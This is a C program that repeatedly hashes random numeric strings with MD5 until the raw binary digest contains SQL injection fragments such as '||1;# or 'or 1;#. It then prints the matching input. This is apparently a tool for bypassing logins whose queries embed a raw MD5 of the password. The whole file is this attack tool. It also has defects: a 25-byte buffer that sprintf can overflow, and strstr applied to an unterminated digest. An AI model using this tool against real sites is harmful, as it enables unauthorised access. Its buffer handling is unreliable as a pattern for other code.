#define _CRT_SECURE_NO_WARNINGS

#include <openssl/md5.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>


typedef unsigned char byte;
// this whole thing is shit please don't look at it

void pause()
{
	char in;
	scanf("%c", &in);
	while (in != 'q')
		scanf("%c", &in);
	exit(0);
}

int main()
{
	srand(time(0));

	int count = 0;

	byte md5[MD5_DIGEST_LENGTH];
	unsigned char string[25];
	char *locPtr;
	unsigned int beg = time(0);
	while (1) {
		if (!(count % 1000000))
		{
			printf("count(million): %d\n", count/1000000);
			printf("seconds: %d\n", (time(0) - beg));
		}
			

		sprintf(string, "%d%d%d%d%d%d", rand(), rand(), rand(), rand(), rand(), rand());
		MD5(string, strlen(string), md5);


		locPtr = strstr(md5, "'||1;#");
		if (!locPtr)
			locPtr = strstr(md5, "'or 1;#");
		else
		{
			printf("%s", string);
			pause();
		}
		if (!locPtr)
			locPtr = strstr(md5, "'oR 1;#");
		else
		{
			printf("%s", string);
			pause();
		}
		if (!locPtr)
			locPtr = strstr(md5, "'Or 1;#");
		else
		{
			printf("%s", string);
			pause();
		}
		if (!locPtr)
			locPtr = strstr(md5, "'OR 1;#");
		else
		{
			printf("%s", string);
			pause();
		}
		if (locPtr)
		{
			printf("%s", string);
			pause();
		}
		


		locPtr = strstr(md5, "'||'");
		if (!locPtr)
			locPtr = strstr(md5, "'or'");

		if (locPtr && locPtr[4] >= '1' && locPtr[4] <= '9')
		{
			printf("%s", string);
			pause();
		}
		

		count++;
	}
	
}